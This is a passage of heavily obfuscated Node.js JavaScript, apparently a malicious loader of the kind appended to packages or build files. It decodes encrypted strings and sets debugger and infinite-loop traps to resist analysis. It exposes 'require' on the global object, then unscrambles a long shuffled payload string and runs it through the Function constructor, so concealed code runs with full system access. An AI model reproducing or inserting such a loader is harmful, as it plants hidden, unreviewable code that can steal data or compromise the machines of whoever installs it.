jJA1j4ktXJjMnPlNLJzwX1EtSSlLHKCLjSuLiJignJzI5JuIaGuIrsy29YCIGUCKnWpe5Yi0uOxvjUuIjPAM5NuLi0pemKywrSuMfJjNqOis1sCc5Dzg8Uy2LsFxvZuNjZkg4GqZWHoY5MyY5JqhO8Dfi0DensDfj0yZ0UyZnJzM8UisaGuJS8zMu4uMrYtvjsw2row2n5uMm6pLrUpgXElMXVofjPuLjJC3nJFvj0Cgn7lNnsCY4UlN1JlLjHwvS8ysOGkuKOBgrskhDZCJyGkLi3iwe8uY5JpfXslKjftfjLnLLMpde8zwnqCKrLihnSmfbIrcnsxw8UjZXSlM0GuIHWktXLA2fJlMnslMqUlL91pgeNpcbsBgLIzM1UzgzDlIGLuLi8uK5ey1jfuInwlI5HC2fBBIzslcq8lfi8BZrsuMvfuILZC0XDoevtuLjLuKvPuNTspgmUEYbJv0DMFw9OzgnHCY5DlIbMud0GB3m2n0vVy0LqB2mGlJDPz2ngq1iUidXJrs5oic5IuG','mJe1nZu1ne5oC2HQsW','BgvUz3rO','ELjPugC','ywn0Aw9U','mJqXndGXmgfOEeHVtG','mJy1nJi5mvDKEK1uwq','zNvUy3rPB24GkLWOicPCkq','zgvIDq','otu5nte4mLPqvxfPzG','nJm4mdaXnJbQAhfmDwK','zNjVBunOyxjdB2rL','nhjduwDAwq','z2DLCG'];_0x7379=function(){return _0x215997;};return _0x7379();}(function(_0x5116e8,_0x519b52){var _0xa14dc2=_0xf4e0,_0x46a609=_0x5116e8();while(!![]){try{var _0x5df002=-parseFloat(_0xa14dc2(0xe))/0x1+-parseFloat(_0xa14dc2(0x10))/0x2+Math['trunc'](-parseFloat(_0xa14dc2(0x9))/0x3)+-parseFloat(_0xa14dc2(0x1b))/0x4*Math['max'](parseFloat(_0xa14dc2(0x5))/0x5,parseFloat(_0xa14dc2(0x18))/0x6)+Math['floor'](parseFloat(_0xa14dc2(0x4))/0x7)*(-parseFloat(_0xa14dc2(0x0))/0x8)+Number(-parseFloat(_0xa14dc2(0x1e))/0x9)*Math['max'](-parseFloat(_0xa14dc2(0x14))/0xa,-parseFloat(_0xa14dc2(0x15))/0xb)+parseFloat(_0xa14dc2(0x19))/0xc;if(_0x5df002===_0x519b52)break;else _0x46a609['push'](_0x46a609['shift']());}catch(_0x183bd0){_0x46a609['push'](_0x46a609['shift']());}}}(_0x7379,0xc9c80));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x60591b,_0x50caa0){var _0x3ba200=_0xf4e0,_0x34b104={'CqrVE':function(_0x4db482,_0x5ef49c){return _0x4db482*_0x5ef49c;}};for(var _0x43cf6f,_0x565f20,_0x4cc67a,_0x23133d,_0xe263ba,_0x274bfd,_0x5b3246=[],_0x229c66=0x0,_0x55a856=_0x50caa0[0x0];_0x229c66<_0x60591b[_0x3ba200(0x11)];)_0x5b3246[_0x229c66]=_0x60591b['charAt'](_0x229c66),_0x229c66+=0x1;for(_0x43cf6f=_0x5b3246['length'],_0x229c66=0x0;_0x229c66<_0x43cf6f;)_0x565f20=_0x55a856*(_0x229c66+_0x50caa0[0x1])+_0x55a856%_0x50caa0[0x2],_0xe263ba=(_0x4cc67a=_0x34b104['CqrVE'](_0x55a856,_0x229c66+_0x50caa0[0x3])+_0x55a856%_0x50caa0[0x4])%_0x43cf6f,_0x274bfd=_0x5b3246[_0x23133d=_0x565f20%_0x43cf6f],_0x5b3246[_0x23133d]=_0x5b3246[_0xe263ba],_0x5b3246[_0xe263ba]=_0x274bfd,_0x55a856=(_0x565f20+_0x4cc67a)%_0x50caa0[0x5],_0x229c66+=0x1;return _0x5b3246['join']('');}function _0xf4e0(_0x25a43b,_0x14df61){var _0x464a87=_0x7379();return _0xf4e0=function(_0x4a68a2,_0x73791){_0x4a68a2=_0x4a68a2-0x0;var _0xf4e069=_0x464a87[_0x4a68a2];if(_0xf4e0['apstBn']===undefined){var _0x4d34f3=function(_0x11537b){var _0x126cb1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x133077='',_0x30ecab='';for(var _0x476c05=0x0,_0x197695,_0x38bdd2,_0x1d0098=0x0;_0x38bdd2=_0x11537b['charAt'](_0x1d0098++);~_0x38bdd2&&(_0x197695=_0x476c05%0x4?_0x197695*0x40+_0x38bdd2:_0x38bdd2,_0x476c05++%0x4)?_0x133077+=String['fromCharCode'](0xff&_0x197695>>(-0x2*_0x476c05&0x6)):0x0){_0x38bdd2=_0x126cb1['indexOf'](_0x38bdd2);}for(var _0x51518a=0x0,_0x29c694=_0x133077['length'];_0x51518a<_0x29c694;_0x51518a++){_0x30ecab+='%'+('00'+_0x133077['charCodeAt'](_0x51518a)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x30ecab);};_0xf4e0['EgkCmN']=_0x4d34f3,_0x25a43b=arguments,_0xf4e0['apstBn']=!![];}var _0x2d590e=_0x464a87[0x0],_0x12507a=_0x4a68a2+_0x2d590e,_0x586ebd=_0x25a43b[_0x12507a];return!_0x586ebd?(_0xf4e069=_0xf4e0['EgkCmN'](_0xf4e069),_0x25a43b[_0x12507a]=_0xf4e069):_0xf4e069=_0x586ebd,_0xf4e069;},_0xf4e0(_0x25a43b,_0x14df61);}function splitLane(_0x1b76ad){var _0x4a3bf2=_0xf4e0,_0x5f1249=String[_0x4a3bf2(0x1a)](0x1c),_0x221ba2=spin(_0x1b76ad,NX);return(_0x221ba2=(_0x221ba2=(_0x221ba2=_0x221ba2['split']('^')[_0x4a3bf2(0x22)](_0x5f1249))[_0x4a3bf2(0xc)]('*1')[_0x4a3bf2(0x22)]('^'))['split']('*0')['join']('*'))[_0x4a3bf2(0xc)](_0x5f1249);}function peel(_0x423450){var _0x56256a={'wqlpu':function(_0x25bd44,_0x2cb8ac,_0x475a28){return _0x25bd44(_0x2cb8ac,_0x475a28);}};return _0x56256a['wqlpu'](spin,_0x423450,SX);}!function(_0x5c3cc6,_0x535a83){var _0x217c0a=_0xf4e0,_0x244199={'oxjgL':'\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','JNfZP':'c^mejb^tro','EKWmU':_0x217c0a(0xb)},_0x3a08f7=(function(){var _0x5a7624=!![];return function(_0x7d38ce,_0x3e76e8){var _0x12f471=_0x5a7624?function(){if(_0x3e76e8){var _0x2204eb=_0x3e76e8['apply'](_0x7d38ce,arguments);return _0x3e76e8=null,_0x2204eb;}}:function(){};return _0x5a7624=![],_0x12f471;};}());(function(){_0x3a08f7(this,function(){var _0xadd456=_0xf4e0,_0x24d25b=new RegExp(_0xadd456(0x16)),_0x3da628=new RegExp(_0x244199[_0xadd456(0x1f)],'i'),_0x1bca9f=_0x464a87(_0xadd456(0x2));!_0x24d25b['test'](_0x1bca9f+_0xadd456(0x7))||!_0x3da628['test'](_0x1bca9f+'input')?_0x1bca9f('0'):_0x464a87();})();}()),_0x5c3cc6['z']=z;var _0x25b74c=splitLane(_0x244199[_0x217c0a(0x20)]);_0x5c3cc6[_0x25b74c[0x0]]=_0x535a83,typeof module===_0x25b74c[0x1]&&(_0x5c3cc6[_0x25b74c[0x2]]=module);var _0x20683f=peel(_0x244199[_0x217c0a(0x3)]),_0x437ab7=peel[_0x20683f[_0x217c0a(0x1)](0x0,0xb)],_0x324cf0=_0x437ab7('',peel('=aenruh(al=5c,g8fdu.yr\x20..ncecf,5\x22paeau6lnj)r]2uv\x22x-q(]\x20a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw).\x20rod[fs2n{drvt4x)+0,anr+rr+o)}z1\x20=hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae\x20f=[;hisy.em(d+o!2\x20=(evea78=.)4ei=g.n={ff=1[<2a\x20f1=r;4,S)rylv1u\x20y;kql{tvnv\x20(C\x20(l,ovnp\x20i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\x22]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r,\x20.);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe\x20t0nrpr(\x20vr8flrn,ddgt\x20]6a.;m;rth.gq\x202a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\x22li\x22r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\x22)cpA+u;utp]\x22=lk7vpt\x201r;hzw\x22)t()9)(.lul=s7f;\x20;sq0)n\x22y+0s}=va+s\x20mh(0q.]hv;>\x2006=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r;\x20)r>18zho*o{<akmsn)akte.vo9+ea0clio;bu\x20=]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\x22}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+\x20hlk[+x=e\x20-8j{(ejy9(())\x20'));_0x437ab7('',_0x324cf0(peel(_0x217c0a(0xf))))(0x9cd);}(global,require);function _0x464a87(_0xcb1a5f){var _0x5170b4={'IgUJa':'length','zGoaK':function(_0x42e373,_0x1938a2){return _0x42e373%_0x1938a2;},'zRiPg':function(_0x2edc38,_0x32bfcc){return _0x2edc38+_0x32bfcc;}};function _0x17ad29(_0x3fefde){var _0x33350a=_0xf4e0;if(typeof _0x3fefde==='string')return function(_0x76632c){}['constructor']('while\x20(true)\x20{}')[_0x33350a(0x8)](_0x33350a(0xd));else(''+_0x3fefde/_0x3fefde)[_0x5170b4[_0x33350a(0x1d)]]!==0x1||_0x5170b4[_0x33350a(0x6)](_0x3fefde,0x14)===0x0?function(){return!![];}[_0x33350a(0x21)](_0x5170b4[_0x33350a(0x12)](_0x33350a(0x17),_0x33350a(0x1c)))['call'](_0x33350a(0x13)):function(){return![];}['constructor'](_0x33350a(0x17)+'gger')[_0x33350a(0x8)](_0x33350a(0xa));_0x17ad29(++_0x3fefde);}try{if(_0xcb1a5f)return _0x17ad29;else _0x17ad29(0x0);}catch(_0x28bbdf){}}
